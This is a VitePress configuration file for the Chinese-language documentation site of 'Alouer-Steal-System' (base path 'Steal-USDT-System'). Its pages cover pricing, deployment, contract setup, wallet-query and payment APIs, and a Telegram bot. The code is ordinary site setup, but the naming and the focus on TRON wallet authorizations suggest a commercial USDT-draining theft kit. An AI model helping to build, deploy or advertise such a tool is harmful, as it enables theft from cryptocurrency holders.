import { defineConfig } from 'vitepress'

export default defineConfig({
  title: 'Alouer-Steal-System',
  description: 'TRON 链钱包授权管理系统 - 多链钱包监控、智能合约交互、Telegram 机器人',
  lang: 'zh-CN',
  base: '/Steal-USDT-System/',

  head: [
    ['link', { rel: 'icon', href: '/Steal-USDT-System/favicon.ico' }],
    ['meta', { name: 'theme-color', content: '#0a0a0a' }],
  ],

  themeConfig: {
    logo: false,
    siteTitle: 'Alouer-Steal',

    nav: [
      { text: '产品介绍', link: '/intro/overview' },
      { text: '部署方式', link: '/intro/deployment' },
      { text: '使用方式', link: '/intro/usage' },
    ],

    sidebar: {
      '/intro/': [
        {
          text: 'Alouer-Steal-System',
          items: [
            { text: '项目介绍 & 定价', link: '/intro/overview' },
            { text: '部署方式', link: '/intro/deployment' },
            { text: '配置页面介绍', link: '/intro/configuration' },
            { text: '使用方式', link: '/intro/usage' },
            { text: '版本 / 隐私 / 法律', link: '/intro/legal' },
          ]
        },
        {
          text: '技术参考',
          items: [
            { text: '系统架构', link: '/guide/architecture' },
            { text: '数据库设计', link: '/guide/database' },
            { text: '合约部署', link: '/guide/contract' },
            { text: 'API 接口', link: '/api/overview' },
          ]
        }
      ],
      '/guide/': [
        {
          text: '技术参考',
          items: [
            { text: '系统架构', link: '/guide/architecture' },
            { text: '数据库设计', link: '/guide/database' },
            { text: '合约部署', link: '/guide/contract' },
          ]
        }
      ],
      '/api/': [
        {
          text: 'API 参考',
          items: [
            { text: '接口概览', link: '/api/overview' },
            { text: '钱包查询', link: '/api/query-address' },
            { text: '浏览播报', link: '/api/browse-broadcast' },
            { text: '代理接口', link: '/api/agent' },
            { text: '支付验证', link: '/api/payment-verify' },
            { text: '配置接口', link: '/api/config' },
          ]
        }
      ]
    },

    socialLinks: [
      { icon: 'github', link: 'https://github.com/raquelhuss/Steal-USDT-System' }
    ],

    search: {
      provider: 'local',
      options: {
        translations: {
          button: { buttonText: '搜索', buttonAriaLabel: '搜索文档' },
          modal: {
            noResultsText: '未找到结果',
            resetButtonTitle: '清除',
            footer: { selectText: '选择', navigateText: '切换', closeText: '关闭' }
          }
        }
      }
    },

    footer: {
      message: 'TRON 钱包授权管理系统',
      copyright: `© ${new Date().getFullYear()} Alouer-Steal-System`
    },

    docFooter: {
      prev: '上一页',
      next: '下一页'
    },

    outline: {
      label: '页面导航'
    },

    lastUpdated: {
      text: '最后更新'
    }
  },

  markdown: {
    theme: { light: 'github-dark', dark: 'github-dark' },
    lineNumbers: true,
  }
})
